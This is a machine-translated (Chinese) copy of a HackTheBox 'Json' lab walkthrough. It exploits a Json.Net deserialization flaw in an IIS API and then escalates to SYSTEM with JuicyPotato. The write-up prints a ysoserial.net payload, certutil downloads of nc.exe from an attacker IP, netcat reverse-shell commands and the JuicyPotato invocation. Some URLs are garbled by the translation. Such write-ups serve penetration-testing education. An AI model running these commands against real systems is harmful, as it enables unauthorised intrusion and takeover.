<html>
<head>
<title>HacktheBox — Json</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">HacktheBox — Json</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/hackthebox-json-5c91db6b67ed?source=collection_archive---------0-----------------------#2020-02-15">https://infosecwriteups.com/hackthebox-json-5c91db6b67ed?source=collection_archive---------0-----------------------#2020-02-15</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/29970651bdaa87177be9432dec140794.png" data-original-src="https://miro.medium.com/v2/resize:fit:1358/format:webp/1*8rRi8WXr4SvAwkXuGaZ0kA.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated"><a class="ae kc" href="https://www.hackthebox.eu/home/machines/profile/210" rel="noopener ugc nofollow" target="_blank">https://www.hackthebox.eu/home/machines/profile/210</a></figcaption></figure><p id="6314" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">这是一篇关于我如何从HacktheBox解决Json的文章。</p><p id="17c6" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><a class="ae kc" href="http://hackthebox.eu" rel="noopener ugc nofollow" target="_blank">黑盒子</a>是一个在线平台，你可以在这里练习渗透测试技能。</p><h1 id="aeb4" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">总结:</h1><pre class="lz ma mb mc gt md me mf mg aw mh bi"><span id="3e17" class="mi lc iq me b gy mj mk l ml mm">An IIS Server is vulnerable to JSON de-serialization using the client's HTTP Authentication Bearer field, leading to code execution. For root, I went the unintended route by using JuicyPotato since SEImpersonatePrivilege is enabled plus this is a Windows 2012 R2 Datacenter machine.</span></pre><h1 id="0dee" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">扫描:</h1><p id="1695" class="pw-post-body-paragraph kd ke iq kf b kg mn ki kj kk mo km kn ko mp kq kr ks mq ku kv kw mr ky kz la ij bi translated">我首先运行nmap扫描:</p><pre class="lz ma mb mc gt md me mf mg aw mh bi"><span id="db8d" class="mi lc iq me b gy mj mk l ml mm">nmap -sV -sC -oA nmap/initial 10.10.10.158</span></pre><figure class="lz ma mb mc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ms"><img src="../Images/0f238e4c8545dd7c24c5ac7923d2149c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1tcPOojBjpe_54IpCwCzjw.png"/></div></div></figure><p id="3ad4" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">开放端口是21、80、SMB和RPC端口。它还告诉我们，操作系统是Windows Server 2008 R2，这很奇怪。我首先检查80端口上的网页。</p><h2 id="83e7" class="mi lc iq bd ld mt mu dn lh mv mw dp ll ko mx my lp ks mz na lt kw nb nc lx nd bi translated">/login.html</h2><figure class="lz ma mb mc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ne"><img src="../Images/dc64c174f8c21ee1821e7499f642271e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*93oTAXxtN_UxDzHdG7zK9A.png"/></div></div></figure><p id="50a3" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在尝试基本凭证之前，我首先检查了源代码，发现它很有趣，因为我看到了C#或其他语言中通常使用的文本。网族。</p><figure class="lz ma mb mc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nf"><img src="../Images/b99c181357bbbcbf1f4a4ac8fd86eaf6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*X1lVpHrnCq2fI8TzvudJaw.png"/></div></div></figure><p id="7d0a" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我尝试使用凭证admin:admin并使用Burp捕获请求:</p><figure class="lz ma mb mc gt jr gh gi paragraph-image"><div class="gh gi ng"><img src="../Images/5d8bcec0465e55a4ec0104a587955aa6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1380/format:webp/1*JBMkL9YNHj72JVCYmpi33w.png"/></div></figure><p id="21ea" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">注意，它提交给端点/api/token，Referer字段是/login.html，Content-Type是application/json。</p><p id="a85c" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">检查响应，通常在API中看到的是202。HTTP状态<code class="fe nh ni nj me b">202</code>表示请求已被接受进行处理，但处理尚未完成。</p><figure class="lz ma mb mc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nk"><img src="../Images/96a1b35a63cf1a1c4b482423177e0c6d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rz70HozGIM3rEELsFZiSfQ.png"/></div></div></figure><p id="ca3b" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">另请注意，响应的标头包括以下内容:</p><pre class="lz ma mb mc gt md me mf mg aw mh bi"><span id="4009" class="mi lc iq me b gy mj mk l ml mm">Server: Microsoft-IIS/8.5<br/>X-AspNet-Version: 4.0.30319<br/>X-Powered-By: ASP.NET<br/>Oauth2= eyJJ..</span></pre><p id="9d0c" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">Oauth2的值看起来像一个JWT，由base64字符组成。解码结果为以下值:</p><figure class="lz ma mb mc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nl"><img src="../Images/d2db4e20d6438740e6e52be93e5fb39d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*P1fZNlAwkxZRqqcIxwzPsQ.png"/></div></div></figure><p id="e98f" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">密码字段看起来像md5散列。在字符串admin上运行md5sum，我们可以验证就是它。</p><figure class="lz ma mb mc gt jr gh gi paragraph-image"><div class="gh gi nm"><img src="../Images/aeeb370c2df6f5f38981a811ba7d925f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1160/format:webp/1*PcaJKrv8jD5jwfN9mB0_vQ.png"/></div></figure><p id="c9cf" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">登录页面如下所示。</p><figure class="lz ma mb mc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nn"><img src="../Images/5f52da44606730aaca7232eb62d8769d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EMp_BArwaMzNUZfI110T2A.png"/></div></div></figure><h2 id="032a" class="mi lc iq bd ld mt mu dn lh mv mw dp ll ko mx my lp ks mz na lt kw nb nc lx nd bi translated">剥削:</h2><p id="9d40" class="pw-post-body-paragraph kd ke iq kf b kg mn ki kj kk mo km kn ko mp kq kr ks mq ku kv kw mr ky kz la ij bi translated">单击各种链接并捕获请求后，有趣的是单击仪表板链接。</p><p id="9e02" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">选择仪表板选项时，请求如下所示:</p><figure class="lz ma mb mc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi no"><img src="../Images/d567670d05cb01fb2531fff769ba2714.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ckzku5m1xv5TZjEjxaYAFA.png"/></div></div></figure><p id="a4a4" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">还要注意，承载字段与OAuth2相同。因为它基本上是用base64编码的JSON值，由C#服务器解释，所以我寻找与这些事件相关的漏洞或攻击媒介。大多数链接暗示了JSON反序列化攻击。</p><figure class="lz ma mb mc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi np"><img src="../Images/0062d8cf5c0bcc6c095e73bd9a7b9361.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1-gMFb2d6c4DoOppEHn6Xg.png"/></div></div></figure><p id="896a" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">经过研究，大多数文章建议使用ysoserial.net项目，这是一个反序列化有效负载生成器。<a class="ae kc" href="https://github.com/pwntester/ysoserial.net" rel="noopener ugc nofollow" target="_blank">https://github.com/pwntester/ysoserial.net</a>。在此之前，我尝试检查如果我在Bearer字段中放置的值不是Json格式，服务器如何响应。</p><pre class="lz ma mb mc gt md me mf mg aw mh bi"><span id="7416" class="mi lc iq me b gy mj mk l ml mm">root@kali:~/htb/boxes/Json-10.10.10.158# echo -n "test" | base64<br/>dGVzdA==</span></pre><p id="a943" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">发送请求:</p><figure class="lz ma mb mc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nq"><img src="../Images/d20d27d65a6c90e7ff7d469513d06723.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*TnCv7yqwBixAOzL0ECKrDA.png"/></div></div></figure><p id="b516" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">服务器的响应提到了“无法反序列化Json.Net对象”。</p><figure class="lz ma mb mc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nr"><img src="../Images/91b7c15f7b437720ecc44c9689feedac.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-LAIWacMuzmJ3Kd9vcUvzg.png"/></div></div></figure><p id="0d88" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">然后我用ysoserial.net。在Windows机器上运行这个程序，我可以使用小工具ObjectDataProvider，因为它的一个格式化程序是Json.Net，上面提到服务器不能反序列化Json.Net对象。这表明它希望数据以Json.Net的格式发送。我首先尝试对我的IP执行ping，输出应该是base64:</p><pre class="lz ma mb mc gt md me mf mg aw mh bi"><span id="f399" class="mi lc iq me b gy mj mk l ml mm">.\ysoserial.exe -f Json.Net -g ObjectDataProvider -o base64 -c "ping -n 2 10.10.14.81"</span></pre><p id="b9e4" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">base64中ysoserial的输出:</p><pre class="lz ma mb mc gt md me mf mg aw mh bi"><span id="c4b7" class="mi lc iq me b gy mj mk l ml mm">ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4<br/>wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogIC<br/>AgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249N<br/>C4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywnL2Mg<br/>cGluZyAtbiAyIDEwLjEwLjE0LjgxJ10NCiAgICB9LA0KICAgICdPYmplY3RJbnN0YW5jZSc6eyckdHlwZSc6J1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXN<br/>zLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5J30NCn0=</span></pre><p id="cf31" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">如果您想知道它在原始输出中的样子:</p><pre class="lz ma mb mc gt md me mf mg aw mh bi"><span id="b59d" class="mi lc iq me b gy mj mk l ml mm">{<br/>    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKey<br/>Token=31bf3856ad364e35',<br/>    'MethodName':'Start',<br/>    'MethodParameters':{<br/>        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e<br/>089',<br/>        '$values':['cmd','/c ping -n 2 10.10.14.81']<br/>    },<br/>    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77<br/>a5c561934e089'}<br/>}</span></pre><p id="40d6" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我现在将它粘贴到不记名字段:</p><figure class="lz ma mb mc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ns"><img src="../Images/35accd61f4fce673223dfcff5046a8dc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*IZDy1E7m_XK3hIWfFqEYiQ.png"/></div></div></figure><p id="9816" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">服务器出错:</p><figure class="lz ma mb mc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nt"><img src="../Images/761458c5da820b23cb68fb36f7bf9a4c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XZOw8GOBqpZUnPhLsINBRg.png"/></div></div></figure><p id="bd12" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">但是在我的tcpdump嗅探器上，我从机器上得到一个ping(如果你不运行嗅探器，你将无法识别你是否得到了ping ),这验证了我们有代码执行。</p><figure class="lz ma mb mc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nu"><img src="../Images/dfc1e6ddf2112f3ebce8a44a0cef7e8a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Gz5icZq9qsw4y6I7htMneg.png"/></div></div></figure><p id="8ef7" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我现在生成一个有效负载，它将netcat二进制文件下载到我可以写入的一个目录中。其他位置可以在这里找到:<a class="ae kc" href="https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md" rel="noopener ugc nofollow" target="_blank">https://github . com/API 0 cradle/UltimateAppLockerByPassList/blob/master/Generic-applockerbypasss . MD</a></p><pre class="lz ma mb mc gt md me mf mg aw mh bi"><span id="bdfb" class="mi lc iq me b gy mj mk l ml mm">ysoserial.exe -f Json.Net -g ObjectDataProvider -o base64 -c "certutil.exe -urlcache -sp<br/>lit -f http://10.10.14.81/nc.exe C:/Windows/System32/spool/drivers/color/nc.exe"</span></pre><p id="b663" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在我的简单HTTP服务器上，我收到一个请求:</p><figure class="lz ma mb mc gt jr gh gi paragraph-image"><div class="gh gi nv"><img src="../Images/f9d121b2b4c8f4e4d7c840af7e9cf373.png" data-original-src="https://miro.medium.com/v2/resize:fit:1352/format:webp/1*5uShXXX8nqvUjg1rFHj5bw.png"/></div></figure><p id="7a63" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">现在，我生成一个有效负载，它将连接到我的反向shell:</p><pre class="lz ma mb mc gt md me mf mg aw mh bi"><span id="7b37" class="mi lc iq me b gy mj mk l ml mm">ysoserial.exe -f Json.Net -g ObjectDataProvider -o base64 -c "C:/Windows/System32/spool/drivers/color/nc.exe 10.10.14.81 9001 -e cmd.exe"</span></pre><p id="6d49" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在我的监听器上，我得到一个json形式的shell。</p><figure class="lz ma mb mc gt jr gh gi paragraph-image"><div class="gh gi nw"><img src="../Images/96bb537ab7838000111eb5dc1f6f0028.png" data-original-src="https://miro.medium.com/v2/resize:fit:1012/format:webp/1*mhcdvRGfLBchaOEmRLv65A.png"/></div></figure><p id="1474" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">运行whoami /all，我可以看到SeImpersonatePrivilege已启用。也就是说我以后可以试着用JuicyPotato。</p><figure class="lz ma mb mc gt jr gh gi paragraph-image"><div class="gh gi nx"><img src="../Images/8104412693ba9e51823529d16cdf845b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1124/format:webp/1*2BSAfSKp8IKwGXg8f1-2Dg.png"/></div></figure><figure class="lz ma mb mc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ny"><img src="../Images/30c710ce8a291b4a6b3ced3e495efb55.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ISABmhST-_h4TJmJDYZs0w.png"/></div></div></figure><p id="868b" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">有了这个访问权限，我现在可以读取user.txt了</p><figure class="lz ma mb mc gt jr gh gi paragraph-image"><div class="gh gi nz"><img src="../Images/f0653c64c6a2321f1d0b285adb2b2018.png" data-original-src="https://miro.medium.com/v2/resize:fit:1140/format:webp/1*5z6HLfr_6MUFgAdk5LZNEg.png"/></div></figure><pre class="lz ma mb mc gt md me mf mg aw mh bi"><span id="bba8" class="mi lc iq me b gy mj mk l ml mm">C:\Users\userpool&gt;type Desktop\user.txt<br/>type Desktop\user.txt<br/>34459a01f50050dc410db0...</span></pre><h2 id="50eb" class="mi lc iq bd ld mt mu dn lh mv mw dp ll ko mx my lp ks mz na lt kw nb nc lx nd bi translated">权限提升:</h2><p id="7986" class="pw-post-body-paragraph kd ke iq kf b kg mn ki kj kk mo km kn ko mp kq kr ks mq ku kv kw mr ky kz la ij bi translated">我选择了使用JuicyPotato的非预期路线。JuicyPotato是另一个本地权限提升工具，从Windows服务帐户到NT AUTHORITY\SYSTEM。它基于RottenPotato，其背后的理论根据页面<a class="ae kc" href="https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/" rel="noopener ugc nofollow" target="_blank">https://fogloversecurity . com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/</a>为:</p><ol class=""><li id="68b3" class="oa ob iq kf b kg kh kk kl ko oc ks od kw oe la of og oh oi bi translated">诱骗“NT AUTHORITY\SYSTEM”帐户通过NTLM向我们控制的TCP端点进行身份验证。</li><li id="8cda" class="oa ob iq kf b kg oj kk ok ko ol ks om kw on la of og oh oi bi translated">中间人身份验证尝试(NTLM中继)在本地协商“NT AUTHORITY\SYSTEM”帐户的安全令牌。这是通过一系列Windows API调用完成的。</li><li id="f280" class="oa ob iq kf b kg oj kk ok ko ol ks om kw on la of og oh oi bi translated">模拟我们刚刚协商好的令牌。只有当攻击者的当前帐户拥有模拟安全令牌的权限时，才能做到这一点。这通常适用于大多数服务帐户，而不适用于大多数用户级帐户。</li></ol><p id="55a3" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">JuicyPotato可以在这里找到:【https://github.com/ohpe/juicy-potato T4】</p><p id="53a3" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我首先将二进制文件传输到一个我可以写入的目录，使用certutil传输它:</p><pre class="lz ma mb mc gt md me mf mg aw mh bi"><span id="6fe2" class="mi lc iq me b gy mj mk l ml mm">C:\Users\userpool\Music&gt;certutil.exe -urlcache -split -f <a class="ae kc" href="http://10.10.14.81/j.exe" rel="noopener ugc nofollow" target="_blank">http://10.10.14.81/j.exe</a> j.exe</span></pre><p id="a8c7" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">检查它是否可以运行:</p><figure class="lz ma mb mc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi oo"><img src="../Images/4c26b744a966009b371ec2915d4b000c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*P__4yXolUNIp0L8A4a3DPg.png"/></div></div></figure><p id="2f40" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我需要的是以下旗帜:</p><pre class="lz ma mb mc gt md me mf mg aw mh bi"><span id="5a2c" class="mi lc iq me b gy mj mk l ml mm">-t (try both), -p (any program we want to run as system) , -l (which can be anything) , and -c {clsid}</span></pre><p id="af3f" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">因为juicypotato需要依赖于Windows操作系统的clsid。我运行systeminfo，看到这是一个Windows Server 2012 R2数据中心。请注意，根据我们的nmap扫描，它被识别为Windows 2008。</p><figure class="lz ma mb mc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi op"><img src="../Images/7acda05148dab67fa3f2cfe6244f7920.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*vqXgIZwMQYIKFrVqTW7L1g.png"/></div></div></figure><p id="45d1" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我可以在这里寻找可能的CLSID:<a class="ae kc" href="http://ohpe.it/juicy-potato/CLSID/Windows_Server_2012_Datacenter/" rel="noopener ugc nofollow" target="_blank">http://ohpe . it/juicy-potato/CLSID/Windows _ Server _ 2012 _ data center/</a>。</p><p id="5796" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我使用的第一个CLSID as系统是{ e 60687 f 7–01a 1–40aa-86ac-db 1 CBF 673334 }。然后，我使用certutil传输一个. bat文件，它基本上包含:</p><pre class="lz ma mb mc gt md me mf mg aw mh bi"><span id="6ef1" class="mi lc iq me b gy mj mk l ml mm">C:/Windows/System32/spool/drivers/color/nc.exe 10.10.14.81 9003 -e cmd.exe</span></pre><figure class="lz ma mb mc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi oq"><img src="../Images/bd42e48bdcbe39beb2151dde7d517fb6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VQAlsQOUc8SDVnJbb_gZKA.png"/></div></div></figure><p id="781d" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">运行juicypotato:</p><pre class="lz ma mb mc gt md me mf mg aw mh bi"><span id="8c97" class="mi lc iq me b gy mj mk l ml mm">.\j.exe -t * -l 9001 -p c:\Users\userpool\Music\test.bat -c {e60687f7-01a1-40aa-86ac-db1cbf673334}</span></pre><figure class="lz ma mb mc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi or"><img src="../Images/2504a4292253bb693782703b0e420ace.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9AFjNpTGAxDLTjDxoqoBug.png"/></div></div></figure><p id="51e8" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我得到一个外壳作为nt authority\system。我现在可以阅读root.txt:</p><pre class="lz ma mb mc gt md me mf mg aw mh bi"><span id="46d1" class="mi lc iq me b gy mj mk l ml mm">C:\Users\superadmin&gt;type Desktop\root.txt<br/>type Desktop\root.txt<br/>3cc85d1bed2ee84a...</span></pre><p id="f53c" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">所以我就是这么解决Json的。我希望你能从中学到一些东西。感谢阅读我的文章！干杯！🍺</p></div><div class="ab cl os ot hu ou" role="separator"><span class="ov bw bk ow ox oy"/><span class="ov bw bk ow ox oy"/><span class="ov bw bk ow ox"/></div><div class="ij ik il im in"><p id="e4c5" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><em class="oz">关注</em> <a class="ae kc" href="https://medium.com/bugbountywriteup" rel="noopener"> <em class="oz"> Infosec报道</em> </a> <em class="oz">获取更多此类精彩报道。</em></p><div class="pa pb gp gr pc pd"><a href="https://medium.com/bugbountywriteup" rel="noopener follow" target="_blank"><div class="pe ab fo"><div class="pf ab pg cl cj ph"><h2 class="bd ir gy z fp pi fr fs pj fu fw ip bi translated">信息安全报道</h2><div class="pk l"><h3 class="bd b gy z fp pi fr fs pj fu fw dk translated">收集了世界上最好的黑客的文章，主题从bug奖金和CTF到vulnhub…</h3></div><div class="pl l"><p class="bd b dl z fp pi fr fs pj fu fw dk translated">medium.com</p></div></div><div class="pm l"><div class="pn l po pp pq pm pr jw pd"/></div></div></a></div></div></div>    
</body>
</html>